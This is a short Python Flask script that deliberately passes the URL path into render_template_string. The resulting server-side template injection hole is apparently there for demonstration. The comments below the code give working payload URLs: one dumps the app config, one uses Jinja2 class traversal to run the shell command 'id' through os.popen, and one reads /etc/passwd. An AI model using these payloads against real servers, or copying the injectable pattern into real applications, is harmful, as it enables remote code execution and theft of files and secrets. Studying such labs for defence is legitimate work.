#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# string: (default) accepts any text without a slash
# int: accepts positive integers
# float: accepts positive floating point values
# path: like string but also accepts slashes
# uuid: accepts UUID strings

from flask import Flask, render_template_string


app = Flask(__name__)


@app.route('/')
@app.route('/<payload>')
def index(payload=''):
    return render_template_string(payload)


if __name__ == '__main__':
    app.run()


# http://127.0.0.1:5000/{{config.items()}}
# http://127.0.0.1:5000/{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
# http://127.0.0.1:5000/{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].get('open')('/etc/passwd', 'r').read() }}{% endif %}{% endfor %}

# reference
# http://flask.pocoo.org/docs/1.0/quickstart/#variable-rules